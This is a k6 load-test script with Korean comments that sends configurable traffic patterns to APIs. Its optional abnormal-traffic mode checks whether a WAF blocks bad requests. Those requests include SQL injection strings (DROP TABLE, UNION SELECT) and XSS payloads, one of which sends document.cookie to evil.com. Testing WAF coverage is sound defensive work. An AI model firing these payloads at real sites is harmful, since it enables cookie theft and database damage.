/**
 * k6 Load Test Script — 다중 API 독립 부하 + 패턴 선택 + 비정상 트래픽
 *
 * ── API 설정 (apis.json) ──────────────────────────────────────
 * [
 *   {
 *     "name": "상품 등록",
 *     "url": "http://host/v1/product",
 *     "method": "POST",
 *     "headers": { "Content-Type": "application/json" },
 *     "body": {
 *       "requestid": "{{requestid}}",
 *       "uuid": "{{uuid}}",
 *       "id": "item{{random6}}",
 *       "price": "{{randomInt}}"
 *     },
 *     "expectedStatus": 201
 *   },
 *   {
 *     "name": "상품 조회",
 *     "url": "http://host/v1/product",
 *     "method": "GET",
 *     "params": { "id": "item{{random6}}", "requestid": "{{requestid}}", "uuid": "{{uuid}}" },
 *     "expectedStatus": 200
 *   }
 * ]
 *
 * → apis.json의 각 항목이 독립 시나리오로 실행됨
 * → API가 3개이고 RATE=100이면 총 300 req/s
 *
 * ── 템플릿 변수 ───────────────────────────────────────────────
 *   {{requestid}}  → 12자리 랜덤 숫자 문자열
 *   {{uuid}}       → UUID v4
 *   {{random6}}    → 6자리 랜덤 숫자
 *   {{randomInt}}  → 랜덤 정수 (단독 사용 시 number 타입)
 *
 * ── 환경변수 ─────────────────────────────────────────────────
 *   RATE          - 각 API 피크 req/s (기본: 56)
 *   PATTERN       - 트래픽 패턴: rampup | step | spike (기본: rampup)
 *   ABNORMAL_RATE - 비정상 요청 비율 % (기본: 0)
 */

import http from 'k6/http';
import { check } from 'k6';
import { Trend, Rate, Counter } from 'k6/metrics';

// ── 메트릭 정의 ───────────────────────────────────────────────
const customLatency  = new Trend('stress_latency_ms', true);
const customSuccess  = new Rate('stress_success_rate');
const customTotal    = new Counter('stress_total_requests');
const abnormalTotal  = new Counter('stress_abnormal_requests');
const wafBlockRate   = new Rate('stress_waf_block_rate');

// ── 공통 변수 ─────────────────────────────────────────────────
const RATE          = parseInt(__ENV.RATE          || '56');
const PATTERN       = (__ENV.PATTERN     || 'rampup').toLowerCase();
const ABNORMAL_RATE = parseInt(__ENV.ABNORMAL_RATE || '0');

// ── API 설정 로드 ─────────────────────────────────────────────
const TARGET_CONFIGS = JSON.parse(open('../apis.json'));

if (!TARGET_CONFIGS || TARGET_CONFIGS.length === 0) {
  throw new Error('apis.json에 API 설정이 없습니다. 최소 1개 이상의 API를 등록하세요.');
}

const INVALID_PATHS = ['/v1/none', '/v1/admin', '/v1/config', '/v1/unknown', '/v1/test'];

// ── 패턴별 stage 계산 ─────────────────────────────────────────
function buildStages() {
  if (PATTERN === 'step') {
    const steps        = parseInt(__ENV.STEPS        || '4');
    const stepDuration = __ENV.STEP_DURATION         || '1m';
    const sustain      = __ENV.SUSTAIN               || '2m';

    const stages = [];
    for (let i = 1; i <= steps; i++) {
      const stepRate = Math.round(RATE * i / steps);
      stages.push({ duration: '1s',         target: stepRate });
      stages.push({ duration: stepDuration, target: stepRate });
    }
    stages.push({ duration: '1s',    target: RATE });
    stages.push({ duration: sustain, target: RATE });
    return stages;
  }

  if (PATTERN === 'spike') {
    const baseline      = parseInt(__ENV.BASELINE      || '5');
    const warmup        = __ENV.WARMUP                 || '30s';
    const spikeDuration = __ENV.SPIKE_DURATION         || '3m';
    const cooldown      = __ENV.COOLDOWN               || '30s';

    return [
      { duration: warmup,        target: baseline },
      { duration: '5s',          target: RATE     },
      { duration: spikeDuration, target: RATE     },
      { duration: '5s',          target: baseline },
      { duration: cooldown,      target: baseline },
    ];
  }

  // rampup (기본값)
  const rampup   = __ENV.RAMPUP   || '2m';
  const sustain  = __ENV.SUSTAIN  || '3m';
  const rampdown = __ENV.RAMPDOWN || '1m';

  return [
    { duration: rampup,   target: RATE },
    { duration: sustain,  target: RATE },
    { duration: rampdown, target: 0    },
  ];
}

// ── API별 독립 시나리오 생성 ───────────────────────────────────
// apis.json 항목마다 별도 시나리오 → 각 API가 RATE req/s를 독립적으로 받음
// API 3개 + RATE=100 → 총 300 req/s
function buildScenarios() {
  const scenarios = {};
  TARGET_CONFIGS.forEach((cfg, i) => {
    const label = (cfg.name || `api${i + 1}`)
      .replace(/\s+/g, '_')
      .replace(/[^\w]/g, '')
      .toLowerCase();

    scenarios[`stress_${label}_${i + 1}`] = {
      executor:        'ramping-arrival-rate',
      startRate:       0,
      timeUnit:        '1s',
      preAllocatedVUs: 100,
      maxVUs:          500,
      stages:          buildStages(),
      exec:            'runScenario',
      env:             { SCENARIO_INDEX: String(i) },
    };
  });
  return scenarios;
}

export const options = {
  scenarios: buildScenarios(),

  thresholds: {
    http_req_duration:   ['p(90)<500', 'p(99)<1000'],
    http_req_failed:     ['rate<0.05'],
    stress_success_rate: ['rate>0.95'],
  },
};

// ── 유틸 함수 ─────────────────────────────────────────────────
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function generateRequestId() {
  return String(Math.floor(Math.random() * 1_000_000_000_000)).padStart(12, '0');
}

function getBaseUrl(url) {
  return url.replace(/\/v\d+\/.*$/, '');
}

// ── 템플릿 치환 ───────────────────────────────────────────────
function resolveValue(val) {
  if (typeof val !== 'string') return val;

  if (val === '{{requestid}}') return generateRequestId();
  if (val === '{{uuid}}')      return generateUUID();
  if (val === '{{random6}}')   return String(Math.floor(Math.random() * 1_000_000)).padStart(6, '0');
  if (val === '{{randomInt}}') return Math.floor(Math.random() * 9000) + 1000;

  return val
    .replace(/\{\{requestid\}\}/g, () => generateRequestId())
    .replace(/\{\{uuid\}\}/g,      () => generateUUID())
    .replace(/\{\{random6\}\}/g,   () => String(Math.floor(Math.random() * 1_000_000)).padStart(6, '0'))
    .replace(/\{\{randomInt\}\}/g, () => String(Math.floor(Math.random() * 9000) + 1000));
}

function resolveObject(obj) {
  if (!obj) return null;
  const result = {};
  for (const [k, v] of Object.entries(obj)) {
    result[k] = resolveValue(v);
  }
  return result;
}

// ── HTTP 요청 전송 ────────────────────────────────────────────
function sendRequest(cfg) {
  const method   = (cfg.method || 'POST').toUpperCase();
  const headers  = Object.assign({ 'User-Agent': 'k6-load-test/1.0' }, cfg.headers || {});
  const expected = cfg.expectedStatus || 200;

  let url  = cfg.url;
  let body = null;

  if (method === 'GET' || method === 'DELETE') {
    if (cfg.params) {
      const resolved = resolveObject(cfg.params);
      const qs = Object.entries(resolved)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
        .join('&');
      url = `${url}?${qs}`;
    }
  } else {
    if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
    if (cfg.body) {
      body = JSON.stringify(resolveObject(cfg.body));
    }
  }

  let res;
  switch (method) {
    case 'GET':    res = http.get(url,          { headers, tags: { target_url: cfg.url, method } }); break;
    case 'POST':   res = http.post(url,   body, { headers, tags: { target_url: cfg.url, method } }); break;
    case 'PUT':    res = http.put(url,    body, { headers, tags: { target_url: cfg.url, method } }); break;
    case 'PATCH':  res = http.patch(url,  body, { headers, tags: { target_url: cfg.url, method } }); break;
    case 'DELETE': res = http.del(url,    body, { headers, tags: { target_url: cfg.url, method } }); break;
    default:
      console.error(`[ERROR] 지원하지 않는 HTTP 메서드: ${method}`);
      return;
  }

  check(res, {
    [`HTTP ${expected}`]:  (r) => r.status === expected,
    'latency < 500ms':     (r) => r.timings.duration < 500,
  });

  customLatency.add(res.timings.duration);
  customSuccess.add(res.status === expected);
  customTotal.add(1);
}

// ── 비정상 요청 유형명 ────────────────────────────────────────
const ABNORMAL_TYPE_NAMES = [
  '빈 바디',
  '필수 필드 누락 (requestid/uuid 없음)',
  '잘못된 JSON 형식',
  'SQL 인젝션 패턴',
  'XSS 패턴',
  '초대용량 페이로드 (10KB)',
  '잘못된 Content-Type (text/plain)',
  '존재하지 않는 경로',
];

// ── 비정상 요청 전송 ──────────────────────────────────────────
function sendAbnormalRequest(cfg) {
  const typeIdx = Math.floor(Math.random() * 8);
  const baseUrl = getBaseUrl(cfg.url);

  let url            = cfg.url;
  let payload        = '';
  let expectedStatus = 403;
  const headers      = {
    'Content-Type': 'application/json',
    'User-Agent':   'k6-load-test/1.0',
  };

  switch (typeIdx) {
    case 0: payload = ''; break;
    case 1: payload = JSON.stringify({ length: 256 }); break;
    case 2: payload = '{bad:json,missing:quotes}'; break;
    case 3:
      payload = JSON.stringify({
        requestid: "' OR '1'='1'; DROP TABLE users--",
        uuid:      "' UNION SELECT * FROM information_schema.tables--",
        length:    256,
      });
      break;
    case 4:
      payload = JSON.stringify({
        requestid: '<script>alert(document.cookie)</script>',
        uuid:      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>',
        length:    256,
      });
      break;
    case 5:
      payload = JSON.stringify({
        requestid: generateRequestId(),
        uuid:      generateUUID(),
        length:    256,
        padding:   'X'.repeat(10240),
      });
      break;
    case 6:
      headers['Content-Type'] = 'text/plain';
      payload = `requestid=${generateRequestId()}&uuid=${generateUUID()}`;
      break;
    case 7:
      url = baseUrl + INVALID_PATHS[Math.floor(Math.random() * INVALID_PATHS.length)];
      payload = JSON.stringify({ requestid: generateRequestId(), uuid: generateUUID(), length: 256 });
      expectedStatus = 404;
      break;
  }

  const res = http.post(url, payload, {
    headers,
    tags: { request_type: 'abnormal', target_url: cfg.url },
  });

  const blocked = res.status === expectedStatus;

  check(res, {
    [`비정상 차단 (${expectedStatus})`]: (r) => r.status === expectedStatus,
  });

  if (!blocked) {
    console.warn(
      `[차단 실패] 유형: ${ABNORMAL_TYPE_NAMES[typeIdx]}` +
      ` | 기대: ${expectedStatus}` +
      ` | 실제: ${res.status}` +
      ` | URL: ${url}`
    );
  }

  abnormalTotal.add(1);
  wafBlockRate.add(blocked);
}

// ── 시나리오 실행 함수 ────────────────────────────────────────
// SCENARIO_INDEX로 어떤 API 설정을 사용할지 결정
export function runScenario() {
  const idx = parseInt(__ENV.SCENARIO_INDEX);
  const cfg = TARGET_CONFIGS[idx];

  if (ABNORMAL_RATE > 0 && Math.random() * 100 < ABNORMAL_RATE) {
    sendAbnormalRequest(cfg);
  } else {
    sendRequest(cfg);
  }
}

// ── 요약 출력 ─────────────────────────────────────────────────
export function handleSummary(data) {
  const dur      = data.metrics.http_req_duration;
  const reqs     = data.metrics.http_reqs;
  const fails    = data.metrics.http_req_failed;
  const abnormal = data.metrics.stress_abnormal_requests;
  const waf      = data.metrics.stress_waf_block_rate;

  const rps      = reqs  ? reqs.values.rate.toFixed(2)         : 'N/A';
  const p90      = dur   ? dur.values['p(90)'].toFixed(2)      : 'N/A';
  const p99      = dur   ? dur.values['p(99)'].toFixed(2)      : 'N/A';
  const failRate = fails ? (fails.values.rate * 100).toFixed(2): 'N/A';
  const abnCnt   = abnormal ? abnormal.values.count            : 0;
  const wafRate  = waf   ? (waf.values.rate * 100).toFixed(2) : 'N/A';

  const apiList = TARGET_CONFIGS.map((c, i) => {
    const method = (c.method || 'POST').toUpperCase();
    const name   = c.name ? `  (${c.name})` : '';
    const status = c.expectedStatus || 200;
    return `    ${i + 1}. [${method}] ${c.url} → ${status}${name}`;
  }).join('\n');

  const abnSection = ABNORMAL_RATE > 0 ? `
  ── 비정상 트래픽 ─────────────────────────────
  비정상 요청 수  : ${abnCnt} 건
  WAF 차단 성공률 : ${wafRate} %` : '';

  console.log(`
══════════════════════════════════════════════
  k6 테스트 완료  [패턴: ${PATTERN.toUpperCase()}]
══════════════════════════════════════════════
  대상 API (각각 ${RATE} req/s 독립 부하):
${apiList}
  총 최대 RPS     : ~${RATE * TARGET_CONFIGS.length} req/s
  RPS (전체 합계) : ${rps} req/s
  P90 latency     : ${p90} ms
  P99 latency     : ${p99} ms
  Error rate      : ${failRate} %${abnSection}
══════════════════════════════════════════════`);

  return {};
}
